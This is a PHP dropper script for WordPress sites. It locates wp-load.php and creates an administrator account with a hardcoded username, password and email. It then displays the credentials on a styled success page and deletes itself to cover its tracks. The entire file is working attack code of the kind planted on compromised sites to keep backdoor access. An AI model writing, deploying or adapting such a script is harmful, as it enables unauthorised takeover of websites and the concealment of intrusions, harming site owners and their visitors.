<?php
$path = __DIR__;
while (!file_exists($path.'/wp-load.php') && $path!='/') $path = dirname($path);

if (file_exists($path.'/wp-load.php')) {
    require_once($path.'/wp-load.php');
    require_once(ABSPATH.'wp-admin/includes/user.php');
    
    $u='adminadnan'; $p='berang2kah@345'; $e='adminadnan@localhost.com';
    
    if (!username_exists($u) && !email_exists($e)) {
        $id = wp_create_user($u, $p, $e);
        if (!is_wp_error($id)) {
            (new WP_User($id))->set_role('administrator');
            
            // Tampilkan info
            ?>
            <!DOCTYPE html>
            <html><head><meta charset="UTF-8"><title>Success</title>
            <style>body{font-family:sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:30px 40px;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.3);min-width:320px}h2{text-align:center;color:#2d3748;margin-top:0}.info{background:#f7fafc;padding:15px 20px;border-radius:8px;border-left:4px solid #48bb78}.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e2e8f0}.row:last-child{border-bottom:none}.label{font-weight:600;color:#4a5568}.val{color:#2d3748;word-break:break-all}.pass{font-family:monospace;background:#edf2f7;padding:2px 10px;border-radius:4px}.btn{display:block;background:#48bb78;color:#fff;text-align:center;padding:10px;border-radius:6px;text-decoration:none;margin-top:15px;font-weight:600}.btn:hover{background:#38a169}.warn{font-size:12px;color:#e53e3e;text-align:center;margin-top:12px}.del{font-size:11px;color:#718096;text-align:center;margin-top:8px}</style></head><body>
            <div class="box">
                <h2>✅ Admin Created!</h2>
                <div class="info">
                    <div class="row"><span class="label">Username</span><span class="val"><strong><?=$u?></strong></span></div>
                    <div class="row"><span class="label">Password</span><span class="val pass"><?=$p?></span></div>
                    <div class="row"><span class="label">Email</span><span class="val"><?=$e?></span></div>
                    <div class="row"><span class="label">Role</span><span class="val"><span style="background:#48bb78;color:#fff;padding:0 12px;border-radius:10px;font-size:12px">Administrator</span></span></div>
                </div>
                <a href="<?=wp_login_url()?>" class="btn">🔑 Login Now</a>
                <div class="warn">⚠️ This file will self-delete after this page loads!</div>
                <div class="del">ℹ️ File will be removed automatically</div>
            </div>
            </body></html>
            <?php
            // Hapus file ini setelah ditampilkan
            unlink(__FILE__);
            exit;
        }
    }
    echo "User already exists or error!";
} else echo "WordPress not found!";
?>